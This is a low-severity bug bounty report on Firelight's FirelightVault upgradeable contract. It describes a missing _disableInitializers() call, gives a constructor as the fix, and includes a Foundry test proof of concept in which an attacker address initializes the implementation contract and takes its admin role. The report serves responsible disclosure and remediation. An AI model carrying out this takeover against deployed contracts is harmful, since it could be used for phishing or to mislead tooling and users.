# 59236 sc low implementation contract lacks initializer protection

**Submitted on Nov 10th 2025 at 08:36:23 UTC by @emilesean\_es for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight)

* **Report ID:** #59236
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/firelight-protocol/firelight-core/blob/main/contracts/FirelightVault.sol>
* **Impacts:**

## Description

* **Title:** Implementation Contract Lacks Initializer Protection
* **Description:** The `FirelightVault` implementation contract is upgradeable but lacks a constructor that calls `_disableInitializers()`. This allows any external actor to call the public `initialize()` function on the deployed implementation contract's address, granting themselves administrative control over the implementation contract's internal state. While this does not allow the attacker to control or affect the proxy contract's state, funds, or upgrade mechanism due to the separation of storage, it violates a fundamental security principle of the proxy pattern. This leaves the implementation contract in a state where it could be used for phishing or to mislead off-chain tooling, and it goes against established security best practices for upgradeable contracts.
* **Severity:** Insight: Security Best Practices
* **Location:** [FirelightVault.sol#L22](https://github.com/firelight-protocol/firelight-core/blob/db36312f1fb24efc88c3fde15a760defbc3e6370/contracts/FirelightVault.sol#L22)
* **Count:** 1
* **Remediation:** Add a constructor to the `FirelightVault` contract to disable the initializer. This ensures the implementation contract can never be initialized, securing it as intended. The `/// @custom:oz-upgrades-unsafe-allow constructor` pragma should be included for compatibility with standard upgrade tooling.

  ```solidity
  /// @custom:oz-upgrades-unsafe-allow constructor
  constructor() {
      _disableInitializers();
  }
  ```

## Link to Proof of Concept

<https://gist.github.com/emilesean/45338f06e15757a5d2cf92acb16b8b36>

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import {Test} from "forge-std/Test.sol";
import {FirelightVault} from "contracts/FirelightVault.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract MyToken is ERC20, Ownable, ERC20Permit {
    constructor(address initialOwner) ERC20("MyToken", "MTK") Ownable(initialOwner) ERC20Permit("MyToken") {}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract FirelightVaultTest is Test {
    // EIP-1967 storage slot for implementation address
    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    TransparentUpgradeableProxy internal transparentUpgradeableProxy;
    FirelightVault internal vaultProxy;
    MyToken internal asset;

    function setUp() public {
        // Deploy and set up the vault proxy correctly
        FirelightVault implementation = new FirelightVault();
        asset = new MyToken(address(this));

        bytes memory initParams = abi.encode(
            FirelightVault.InitParams({
                defaultAdmin: address(this),
                limitUpdater: address(this),
                blocklister: address(this),
                pauser: address(this),
                periodConfigurationUpdater: address(this),
                depositLimit: 1 ether,
                periodConfigurationDuration: 4 weeks
            })
        );

        transparentUpgradeableProxy = new TransparentUpgradeableProxy(
            address(implementation),
            address(this),
            abi.encodeWithSignature("initialize(address,string,string,bytes)", asset, "MyToken_Vault", "MTKV", initParams)
        );

        vaultProxy = FirelightVault(address(transparentUpgradeableProxy));
    }

    function test_VULNERABILITY_ImplementationCanBeHijacked() public {
        // 1. Attacker discovers the implementation address from the proxy's storage
        bytes32 implSlotValue = vm.load(address(transparentUpgradeableProxy), IMPLEMENTATION_SLOT);
        address implAddress = address(uint160(uint256(implSlotValue)));
        FirelightVault implementationContract = FirelightVault(implAddress);

        // 2. Attacker initializes the implementation contract, making themself the admin
        address attacker = makeAddr("attacker");
        bytes memory maliciousInitParams = abi.encode(
            FirelightVault.InitParams({
                defaultAdmin: attacker,
                limitUpdater: attacker,
                blocklister: attacker,
                pauser: attacker,
                periodConfigurationUpdater: attacker,
                depositLimit: 1 ether,
                periodConfigurationDuration: 4 weeks
            })
        );
        implementationContract.initialize(asset, "Malicious", "HACK", maliciousInitParams);

        // 3. Assert the attacker is the admin of the implementation, but not the proxy
        assertTrue(
            implementationContract.hasRole(implementationContract.DEFAULT_ADMIN_ROLE(), attacker),
            "Attacker hijacked implementation"
        );
        assertFalse(
            vaultProxy.hasRole(vaultProxy.DEFAULT_ADMIN_ROLE(), attacker),
            "Attacker did not affect proxy"
        );
    }
}
```
